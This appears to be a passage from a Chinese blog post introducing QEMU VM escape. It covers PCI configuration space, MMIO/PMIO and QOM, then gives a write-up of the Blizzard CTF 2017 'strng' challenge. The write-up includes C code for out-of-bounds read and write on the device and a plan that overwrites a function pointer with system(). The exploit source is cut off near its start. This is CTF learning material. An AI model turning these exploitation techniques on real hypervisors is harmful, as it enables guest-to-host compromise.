+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/3.png"></div>
+
+<p>上面我们知道了虚拟机对应的内存起始地址为0x7fdc6be00000，偏移为0x30e65008，那么这个字符串的地址是0x7fdc6be00000+0x30e65008：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/4.png"></div>
+
+<h2 id="PCI设备地址空间"><a href="#PCI设备地址空间" class="headerlink" title="PCI设备地址空间"></a>PCI设备地址空间</h2><p><a href="https://www.cnblogs.com/zszmhd/archive/2012/05/08/2490105.html" target="_blank" rel="noopener">参考</a></p>
+<p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，实际上是一组连续的寄存器，位于设备上。其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/5.png"></div>
+
+<p>剩余的部分是PCI设备自定义的。<br>PCI配置空间头部有6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型(memory space或者I/O space)，基址以及其他属性。BAR的格式如下：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/6.png"></div>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/7.png"></div>
+
+<p>可以看出，设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。</p>
+<p>说到地址空间，计算机系统中，除了我们常说的memory address(包括逻辑地址、虚拟地址(线性地址)、CPU地址(物理地址))，还有I/O address，这是为了访问I/O设备(主要是设备中的寄存器)而设立的，大部分体系结构中，memory address和I/O address都是分别编址的，且使用不同的寻址指令，构成了两套地址空间，也有少数体系结构将memory address和I/O address统一编址(如ARM)。</p>
+<h2 id="MMIO和PMIO"><a href="#MMIO和PMIO" class="headerlink" title="MMIO和PMIO"></a>MMIO和PMIO</h2><p>MMIO(Memory mapping I/O)即内存映射I/O，它是PCI规范的一部分，I/O设备被放置在内存空间而不是I/O空间。从处理器的角度看，内存映射I/O后系统设备访问起来和内存一样。这样访问AGP/PCI-E显卡上的帧缓存，BIOS，PCI设备就可以使用读写内存一样的汇编指令完成，简化了程序设计的难度和接口的复杂性。I/O作为CPU和外设交流的一个渠道，主要分为两种，一种是Port I/O，一种是MMIO(Memory mapping I/O)。<strong>简而言之，MMIO就是通过将外围设备映射到内存空间，便于CPU的访问。</strong></p>
+<p>Port-mapped I/O (PMIO)，端口映射IO，又叫做被隔离的I/O（isolated I/O）。端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。（MMIO实现了CPU容易通过内存来直接访问外设，PMIO实现了CPU如何访问外设）</p>
+<h2 id="qemu查看pci设备"><a href="#qemu查看pci设备" class="headerlink" title="qemu查看pci设备"></a>qemu查看pci设备</h2><p>lspci命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/8.png"></div>
+途中audio、LAN都是PCI设备。
+
+<p>pci设备的寻址是由总线、设备以及功能构成。如下所示：lspci</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/9.png"></div>
+
+<p>xx:yy:z的格式为总线:设备:功能的格式</p>
+<p>可以使用lspci命令以树状的形式输出pci结构：lspci -t -v</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/10.png"></div>
+
+<p>查看设备详细信息： lspci -v</p>
+<p>其中[0000]表示pci的域， PCI域最多可以承载256条总线。每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p>
+<p>总之每个 PCI 设备有一个总线号, 一个设备号, 一个功能号标识。PCI 规范允许单个系统占用多达 256 个总线, 但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)有最多 8 个功能。</p>
+<p>PCI 设备通过VendorIDs、DeviceIDs、以及Class Codes字段区分：</p>
+<p>lspci -v -m -n -s 00:03.0<br>lspci -v -m -s 00:03.0</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/11.png"></div>
+
+<p>查看设备内存空间：lspci -v -s 00:03.0-x</p>
+<h2 id="qemu访问I-O空间"><a href="#qemu访问I-O空间" class="headerlink" title="qemu访问I/O空间"></a>qemu访问I/O空间</h2><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或在用户空间编程进行访问。</p>
+<p>访问mmio编译内核模块，在内核态访问mmio空间，示例代码如下：</p>
+<h2 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h2><p>QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p>
+<p>有几个比较关键的结构体，TypeInfo、TypeImpl、ObjectClass以及Object。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。TypeInfo是用户用来定义一个Type的数据结构，用户定义了一个TypeInfo，然后调用type_register(TypeInfo )或者type_register_static(TypeInfo )函数，就会生成相应的TypeImpl实例，将这个TypeInfo注册到全局的TypeImpl的hash表中。</p>
+<pre class="line-numbers language-c"><code class="language-c">
+structTypeInfo
+<span class="token punctuation">{</span>
+    constchar<span class="token operator">*</span>name<span class="token punctuation">;</span>
+    constchar<span class="token operator">*</span>parent<span class="token punctuation">;</span>
+    size_t instance_size<span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span>instance_init<span class="token punctuation">)</span><span class="token punctuation">(</span>Object<span class="token operator">*</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span>instance_post_init<span class="token punctuation">)</span><span class="token punctuation">(</span>Object<span class="token operator">*</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span>instance_finalize<span class="token punctuation">)</span><span class="token punctuation">(</span>Object<span class="token operator">*</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    boolabstract<span class="token punctuation">;</span>
+    size_t class_size<span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span>class_init<span class="token punctuation">)</span><span class="token punctuation">(</span>ObjectClass<span class="token operator">*</span>klass<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span>class_base_init<span class="token punctuation">)</span><span class="token punctuation">(</span>ObjectClass<span class="token operator">*</span>klass<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span>class_finalize<span class="token punctuation">)</span><span class="token punctuation">(</span>ObjectClass<span class="token operator">*</span>klass<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token operator">*</span>class_data<span class="token punctuation">;</span>
+    InterfaceInfo<span class="token operator">*</span>interfaces<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>TypeImpl的属性与TypeInfo的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl的对象。</p>
+<p>当所有qemu总线、设备等的type_register_static执行完成后，即它们的TypeImpl实例创建成功后，qemu就会在type_initialize函数中去实例化其对应的ObjectClasses。</p>
+<p>每个type都有一个相应的ObjectClass所对应，其中ObjectClass是所有类的基类。<br>用户可以定义自己的类，继承相应类即可：</p>
+<p>可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，TypeInfo::class_init就会调用以实现虚函数的初始化，如下例的pci_testdev_class_init所示：</p>
+<h1 id="Blizzard-CTF-2017-Strng"><a href="#Blizzard-CTF-2017-Strng" class="headerlink" title="Blizzard CTF 2017 Strng"></a>Blizzard CTF 2017 Strng</h1><h2 id="注册流程-amp-设备定位"><a href="#注册流程-amp-设备定位" class="headerlink" title="注册流程&amp;设备定位"></a>注册流程&amp;设备定位</h2><p>该虚拟机是一个Ubuntu Server 14.04 LTS，用户名是ubuntu，密码是passw0rd。因为它把22端口重定向到了宿主机的5555端口，所以可以使用ssh <a href="mailto:ubuntu@127.0.0.1" target="_blank" rel="noopener">ubuntu@127.0.0.1</a> -p 5555登进去。</p>
+<p>将 qemu-system-x64_64 拖到IDA里面，程序较大，IDA需要个小一会才会分析完成。后续整个分析过程是通过IDA与源码对比查看完成，需要指出的是分析过程将IDA中将变量设置成其对应的结构体会容易看很多。</p>
+<p>查看.sh文件中有个-device strng。之前也说过CTF QEMU题目一般问题出在device中，所以逆向分析主要就看device相关的就可以了，即搜索strng相关函数：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/12.png"></div>
+在之前我们知道了 pci_strng_register_types 会注册由用户提供的 TypeInfo ，查看该函数并找到了它的 TypeInfo ，跟进去看到了 strng_class_init 以及 strng_instance_init 函数。
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/13.png"></div>
+
+<p>在strng_class_init中对PCIDeviceClass结构体赋值：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/14.png"></div>
+可以看到 class_init 中设置其 device_id 为 0x11e9 ， vendor_id 为 0x1234 。对应到上面 lspci 得到的信息，可以知道设备为 00:03.0 ，查看其详细信息：
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/15.png"></div>
+
+<p>可以看到有地址为 0xfebf1000 ，大小为256；PMIO地址为 0xc050 ，总共有8个端口。</p>
+<p>再看看resource文件：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/16.png"></div>
+resource0 对应的是MMIO，而 resource1 对应的是PMIO。 resource 中数据格式是 start-address end-address flags 。
+
+<p><strong>接下来我们看strng_instance_init</strong>函数：</p>
+<p>首先看看这个STRNGState结构体：</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/17.png"></div>
+
+<p>该函数则是为 strng  Object赋值了相应的函数指针值 srand 、 rand 以及 rand_r 。</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/18.png"></div>
+
+<p>然后去看 pci_strng_realize ，该函数注册了MMIO和PMIO空间，包括mmio的操作结构 strng_mmio_ops 及其大小 256 ；pmio的操作结构体 strng_pmio_ops 及其大小8。</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/19.png"></div>
+
+<p>strng_mmio_ops 中有访问mmio对应的 strng_mmio_read 以及 strng_mmio_write ； strng_pmio_ops 中有访问pmio对应的 strng_pmio_read 以及 strng_pmio_write ，下面将详细分析这两部分，一般来说，设备的问题也容易出现在这两个部分。</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p><strong>strng_mmio_read</strong></p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/20.png"></div>
+将传入地址右移两位，作为索引返回寄存器的值
+
+<p><strong>strng_mmio_write</strong></p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/21.png"></div>
+当size为4的时候：
+1.当地址右移两位后=1的时候：调用rand函数，赋值寄存器索引为1的地址
+2.当地址右移两位后=3的时候：调用index为2的寄存器作为参数，调用rand_r；结果返回给index为3的寄存器。然后传入的第三个作为值赋值到regs[v4]，其中v4=传入的第二个参数&gt;&gt;2。这样两个参数都可控，是不是我们从这里可以任意地址写入？
+
+<p>但是事实上是不可以的，<strong>前面已经知道了 mmio 空间大小为256，我们传入的addr是不能大于 mmio 的大小；因为pci设备内部会进行检查，而刚好 regs 的大小为256，所以我们无法通过 mmio 进行越界读写。</strong></p>
+<p>通过之前的分析我们知道strng有八个端口，端口起始地址是：0xc050，相应的通过strng_pmio_read和strng_pmio_write去读写<br><strong>strng_pmio_read</strong></p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/22.png"></div>
+当端口地址为0时直接返回 opaque-&gt;addr ，否则将 opaque-&gt;addr 右移两位作为索引 i ，返回 regs[i] 的值
+
+<p><strong>strng_pmio_write</strong></p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/23.png"></div>
+当size等于4的时候：
+    地址为0，将传入的第三个参数赋值给opaque-&gt;addr
+    地址不为0，将opaque-&gt;addr右移两位得到flag，分三个功能：
+        1.flag等于0，执行srand，不保存返回值
+        2.flag等于1，执行rand，返回值保存在regs[1]
+        3.flag等于3，调用rand_r，返回值保存在regs[3]
+        4.否则直接将传入的第三个参数存储在regs[flag]中
+
+<p> 其实直接看起来好像还是可以像mmio_write一样任意地址写。但是PMIO和MMIO的区别在于索引数组的时候，PMIO并不是直接传入的端口地址检索（这样的话会检测失败），而是利用opaque-&gt;addr检索，而 opaque-&gt;addr 的赋值是我们可控的（端口地址为0时，直接将传入的 val 赋值给 opaque-&gt;addr ）。因此 regs 数组的索引可以为任意值，即可以越界读写。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>越界读则是首先通过 strng_pmio_write 去设置 opaque-&gt;addr ，然后再调用 strng_pmio_read 去越界读。</p>
+<p>越界写则是首先通过 strng_pmio_write 去设置 opaque-&gt;addr ，然后仍然通过 strng_pmio_write 去越界写。</p>
+<p>接下来就要知道是怎么设置opaque-&gt;addr的：</p>
+<h3 id="编程访问PMIO"><a href="#编程访问PMIO" class="headerlink" title="编程访问PMIO"></a>编程访问PMIO</h3><p>UAFIO描述说有三种方式访问PMIO，这里仍给出一个比较便捷的方法去访问，即通过 IN 以及  OUT 指令去访问。可以使用 IN 和 OUT 去读写相应字节的1、2、4字节数据（outb/inb, outw/inw, outl/inl），函数的头文件为 &lt;sys/io.h&gt; </p>
+<p>还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于 0x000-0x3ff 之间的端口，使用 ioperm(from, num, turn_on) 即可；对于 0x3ff 以上的端口，则该调用执行 iopl(3) 函数去允许访问所有的端口</p>
+<p>也就是说第二个参数和第三个参数需要我们提供，第一个和第四个不需要提供。<br>典型代码：</p>
+<pre class="line-numbers language-c"><code class="language-c">uint32_t pmio_base<span class="token operator">=</span><span class="token number">0xc050</span><span class="token punctuation">;</span>
+uint32_t <span class="token function">pmio_write</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">,</span> uint32_t value<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">outl</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 写4字节数据</span>
+<span class="token punctuation">}</span>
+uint32_t <span class="token function">pmio_read</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span><span class="token function">inl</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 读4字节数据</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// Open and map I/O memory for the strng device</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iopl</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token number">0</span> <span class="token punctuation">)</span>
+        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"I/O permission is not enough"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_base<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_base<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="编程访问MMIO"><a href="#编程访问MMIO" class="headerlink" title="编程访问MMIO"></a>编程访问MMIO</h3><p>实现对MMIO空间的访问，比较便捷的方式就是使用 mmap 函数将设备的 resource0 文件映射到内存中，再进行相应的读写即可实现MMIO的读写，典型代码如下：</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> mmio_mem<span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">mmio_write</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">,</span> uint32_t value<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem <span class="token operator">+</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+uint32_t <span class="token function">mmio_read</span><span class="token punctuation">(</span>uint32_t addr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem <span class="token operator">+</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+
+    <span class="token comment" spellcheck="true">// Open and map I/O memory for the strng device</span>
+    <span class="token keyword">int</span> mmio_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_SYNC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>mmio_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"mmio_fd open failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    mmio_mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> mmio_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>mmio_mem <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span>
+        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"mmap mmio_mem failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="越界读写逻辑"><a href="#越界读写逻辑" class="headerlink" title="越界读写逻辑"></a>越界读写逻辑</h3><p>1.越界读：首先使用 strng_pmio_write 设置 opaque-&gt;addr ，即当传入的addr 为0时，传入的 val 会直接赋值给 opaque-&gt;addr ；然后再调用 strng_pmio_read ，传入的addr参数等于4就会去读 regs[val&gt;&gt;2] （这里的val&gt;&gt;2实际上是由于位数的关系，实际上就是正常读这个位置的值）的值，实现越界读，代码如下：</p>
+<pre class="line-numbers language-c"><code class="language-c">uint32_t <span class="token function">pmio_arbread</span><span class="token punctuation">(</span>uint32_t offset<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_base<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// pmio_base+0 = opaque->address</span>
+    <span class="token keyword">return</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span>pmio_base<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// pmio_base+5 是opaque->regs位置</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.越界写：仍然是首先使用 strng_pmio_write 设置 opaque-&gt;addr ，即当 addr 为0时，传入的 val 会直接赋值给 opaque-&gt;addr ；然后调用 strng_pmio_write ，并设置传入的addr 为4，即会去将此次传入的 val 写入到 regs[opaque-&gt;addr&gt;&gt;2] 中，实现越界写，代码如下：</p>
+<pre class="line-numbers language-c"><code class="language-c">uint32_t <span class="token function">pmio_arbwrite</span><span class="token punctuation">(</span>uint32_t offset<span class="token punctuation">,</span>uint32_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_base<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span>offset<span class="token punctuation">)</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span>pmio_base<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="完整思路"><a href="#完整思路" class="headerlink" title="完整思路"></a>完整思路</h3><p>第一步：使用 strng_mmio_write 将 cat /root/flag 写入到 regs[2] 开始的内存处，用于后续作为参数。<br>第二步：使用越界读漏洞，读取 regs 数组后面的 srand 地址，根据偏移计算出 system 地址。<br>第三步：使用越界写漏洞，覆盖 regs 数组后面的 rand_r 地址，将其覆盖为 system 地址。<br>第四步：最后使用 strng_mmio_write 触发执行 opaque-&gt;rand_r(&amp;opaque-&gt;regs[2]) 函数，从而实现 system(“cat /root/flag”) 的调用，拿到flag。</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>写exp调试的时候发现执行中，我们原先写入的regs[2]的值被改了，那么我们需要重新写一次</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/24.png"></div>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/25.png"></div>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/26.png"></div>
+
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/io.h></span></span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>mmio_mem<span class="token punctuation">;</span>
+uint32_t pmio_addr <span class="token operator">=</span> <span class="token number">0xc050</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// I/O port</span>
+
+<span class="token keyword">void</span> <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> msg<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">perror</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">mmio_write</span><span class="token punctuation">(</span>uint32_t offset<span class="token punctuation">,</span>uint32_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>
